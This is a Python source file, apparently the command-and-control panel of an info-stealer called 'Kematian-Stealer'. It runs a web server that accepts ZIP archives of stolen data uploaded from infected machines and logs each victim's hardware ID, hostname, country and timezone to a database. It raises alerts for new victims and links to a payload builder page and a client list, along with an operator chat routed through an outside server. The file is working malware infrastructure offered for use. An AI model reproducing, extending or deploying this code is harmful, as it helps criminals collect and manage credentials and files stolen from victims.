import os
import uvicorn
import asyncio
import aiohttp
import aiosqlite
import subprocess

import datetime

from ui.modules.first_time.first_time import MakeFiles
from ui.modules.notifications.notifications import Notifications

from ui.handlers.logs_handler import LogHandler

from ui.pages.frames.main_frame import frame

from ui.pages.index_page import fr_page
from ui.pages.builder_page import builder
from ui.pages.settings_page import settings_stuff
from ui.pages.clients_page import clients_page_stuff

from fastapi import FastAPI, File, UploadFile, HTTPException
from fastapi.responses import JSONResponse


from nicegui import ui, app

app = FastAPI()


good_dir = os.getenv("APPDATA")
file_handler = MakeFiles()
if not os.path.exists(os.path.join(good_dir, "Kematian-Stealer")):
    file_handler.make_all()


db_path = os.path.join(good_dir, "Kematian-Stealer", "kdot.db")

api_base_url = "https://sped.lol"

result = subprocess.check_output(
    ["wmic", "csproduct", "get", "uuid"], universal_newlines=True
)

lines = result.strip().split("\n")
hwid = lines[2].strip()

NOTIFICATIONS = Notifications(discord=False, windows=True)


async def initialize_database():
    """Initialize the database if it doesn't exist."""
    async with aiosqlite.connect(db_path) as db:
        await db.execute(
            """
            CREATE TABLE IF NOT EXISTS entries (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                hwid TEXT UNIQUE,
                country_code TEXT,
                hostname TEXT,
                date TEXT,
                timezone TEXT,
                filepath TEXT
            )
        """
        )
        await db.commit()


@app.on_event("startup")
async def on_startup():
    """Startup event to initialize the database."""
    await initialize_database()


@app.post("/data")
async def receive_data(file: UploadFile = File(...)) -> JSONResponse:
    """Receive data from the client and store it in the database.

    Args:
        file (UploadFile, optional): File that we receive. Defaults to File(...).

    Raises:
        HTTPException: Raise an exception if the file type is not a ZIP file and not formatted correctly.

    Returns:
        JSONResponse: Return a JSON response with the status of the file.
    """
    if file.content_type != "application/zip":
        raise HTTPException(
            status_code=400, detail="Invalid file type. Only ZIP files are allowed."
        )

    handler = LogHandler(file)
    info = handler.get_file_info()

    custom_path = f"{info['country_code']}-({info['hostname']})-({info['date']})-({info['timezone']})"

    async with aiosqlite.connect(db_path) as db:
        await db.execute(
            """
            INSERT OR IGNORE INTO entries (hwid, country_code, hostname, date, timezone, filepath) 
            VALUES (?, ?, ?, ?, ?, ?)
            """,
            (
                info["hwid"],
                info["country_code"],
                info["hostname"],
                info["date"],
                info["timezone"],
                os.path.join(handler.HWID_folder_dir, custom_path),
            ),
        )
        await db.commit()

    out = handler.unzip_file()
    if out:
        NOTIFICATIONS.send_notification(f"New log from {info['hostname']}")
        return JSONResponse(content={"status": "ok"})
    else:
        return JSONResponse(content={"status": "error"})


# @app.get("/data")
# async def get_data() -> JSONResponse:
#    """Get the data from the database.
#
#    Returns:
#        JSONResponse: Return a JSON response with the data from the database.
#    """
#    async with aiosqlite.connect(db_path) as db:
#        cursor = await db.execute("SELECT * FROM entries")
#        rows = await cursor.fetchall()
#        await cursor.close()
#    return JSONResponse(content={"data": rows})


@ui.page("/")
def main_page() -> None:
    """Main page for the stealer. Very simple."""
    with frame(True):
        fr_page()


@ui.page("/builder")
def builder_page() -> None:
    """Builder page for the stealer."""
    with frame():
        builder()


@ui.page("/clients")
async def clients_page() -> None:
    """Clients page for the stealer"""
    with frame(True):
        await clients_page_stuff(db_path)


@ui.refreshable
async def chat_messages(own_id: str) -> None:
    """Chat messages for the chat page.

    Args:
        own_id (str): ID of the user
    """
    async with aiohttp.ClientSession() as session:
        async with session.get(f"{api_base_url}/get_messages") as response:
            messages = await response.json()

    for message in messages:
        ui.chat_message(
            text=message["text"],
            stamp=message["stamp"],
            avatar=message["avatar"],
            sent=own_id == message["user_id"],
        )
    ui.run_javascript("window.scrollTo(0, document.body.scrollHeight)")


@ui.page("/chat")
async def main():
    """Chat page for the stealer."""
    with frame(True):

        def send() -> None:
            stamp = datetime.datetime.now(datetime.UTC).strftime("%X")
            message = {
                "user_id": user_id,
                "avatar": avatar,
                "text": text.value,
                "stamp": stamp,
            }
            text.value = ""
            asyncio.create_task(post_message(message))
            chat_messages.refresh()

        async def post_message(message):
            async with aiohttp.ClientSession() as session:
                await session.post(f"{api_base_url}/send_message", json=message)

        user_id = hwid
        avatar = f"https://robohash.org/{user_id}?set=any"

        with ui.footer().classes("justify-center"), ui.column():
            with ui.row():
                with ui.avatar().on("click", lambda: ui.navigate.to(main)):
                    ui.image(avatar)
                text = (
                    ui.input(placeholder="message")
                    .on("keydown.enter", send)
                    .props("rounded outlined input-class=mx-3")
                    .classes("flex-grow")
                )

        await ui.context.client.connected()
        with ui.column().classes(
            "w-full max-w-2xl mx-auto items-stretch"
        ):  # Align messages to the end (right)
            await chat_messages(user_id)


@ui.page("/settings")
def settings() -> None:
    """Settings page for the stealer. (NEEDS TO BE REWORKED OR ATLEAST A NEW UI LMFAO)"""
    with frame(True):
        settings_stuff()


ui.run_with(app, title="Kematian-Stealer")

if __name__ in {"__main__", "__mp_main__"}:
    try:
        uvicorn.run(app, host="127.0.0.1", port=8000)
        # ui.run(title="Kematian-Stealer", host="127.0.0.1", port=8000, reload=True)
    except KeyboardInterrupt:
        print("Exiting...")
        exit(0)

# USE TABLE FOR CLIENTS
